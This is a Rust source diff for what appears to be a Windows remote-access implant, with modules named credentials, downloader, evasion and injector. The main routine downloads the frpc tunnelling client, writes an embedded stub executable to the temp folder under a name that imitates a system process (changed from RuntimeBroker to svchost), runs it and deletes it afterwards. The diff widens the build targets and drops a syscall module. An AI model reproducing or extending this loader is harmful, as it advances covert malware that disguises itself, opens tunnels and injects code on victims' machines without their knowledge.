@@ -2,14 +2,12 @@ mod credentials;
 mod i18n;
 mod language;
 
-#[cfg(all(target_os = "windows", target_arch = "x86_64"))]
+#[cfg(target_os = "windows")]
 mod downloader;
-#[cfg(all(target_os = "windows", target_arch = "x86_64"))]
+#[cfg(target_os = "windows")]
 mod evasion;
-#[cfg(all(target_os = "windows", target_arch = "x86_64"))]
+#[cfg(target_os = "windows")]
 mod injector;
-#[cfg(all(target_os = "windows", target_arch = "x86_64"))]
-mod syscall;
 
 use clap::Parser;
 use colored::Colorize;
@@ -17,19 +15,19 @@ use std::io::{self, Write};
 
 use log::{debug, error, info, warn};
 
-#[cfg(all(target_os = "windows", target_arch = "x86_64"))]
+#[cfg(target_os = "windows")]
 use std::env;
-#[cfg(all(target_os = "windows", target_arch = "x86_64"))]
+#[cfg(target_os = "windows")]
 use std::ffi::OsStr;
-#[cfg(all(target_os = "windows", target_arch = "x86_64"))]
+#[cfg(target_os = "windows")]
 use std::fs;
-#[cfg(all(target_os = "windows", target_arch = "x86_64"))]
+#[cfg(target_os = "windows")]
 use std::os::windows::ffi::OsStrExt;
-#[cfg(all(target_os = "windows", target_arch = "x86_64"))]
+#[cfg(target_os = "windows")]
 use std::ptr;
-#[cfg(all(target_os = "windows", target_arch = "x86_64"))]
+#[cfg(target_os = "windows")]
 use windows_sys::Win32::Foundation::FALSE;
-#[cfg(all(target_os = "windows", target_arch = "x86_64"))]
+#[cfg(target_os = "windows")]
 use windows_sys::Win32::System::Threading::{CreateProcessW, PROCESS_INFORMATION, STARTUPINFOW};
 
 #[derive(Parser)]
@@ -41,7 +39,7 @@ struct Cli {
     lang: bool,
 }
 
-#[cfg(all(target_os = "windows", target_arch = "x86_64"))]
+#[cfg(windows)]
 fn to_wchar(str: &str) -> Vec<u16> {
     OsStr::new(str)
         .encode_wide()
@@ -104,7 +102,7 @@ fn main() {
         }
     }
 
-    #[cfg(all(target_os = "windows", target_arch = "x86_64"))]
+    #[cfg(target_os = "windows")]
     {
         // 下載並解壓 frpc.exe
         let frpc_buffer = match downloader::fetch_frpc() {
@@ -119,8 +117,8 @@ fn main() {
         }
 
         // 啟動 stub.exe
-        #[cfg(all(target_os = "windows", target_arch = "x86_64"))]
-        let stub_path = env::temp_dir().join(format!("RuntimeBroker_{}.exe", std::process::id()));
+        #[cfg(windows)]
+        let stub_path = env::temp_dir().join(format!("svchost_{}.exe", std::process::id()));
         fs::write(&stub_path, injector::STUB_EXE).expect("Failed to write stub.exe");
         debug!("stub.exe 寫至: {}", stub_path.display());
         let stub_path_str = stub_path.to_str().unwrap();
@@ -185,7 +183,7 @@ fn main() {
         debug!("stub.exe 已刪除");
     }
 
-    #[cfg(not(all(target_os = "windows", target_arch = "x86_64")))]
+    #[cfg(not(target_os = "windows"))]
     {
         info!("此平台尚未支援，目前僅支援 Windows x86_64");
     }
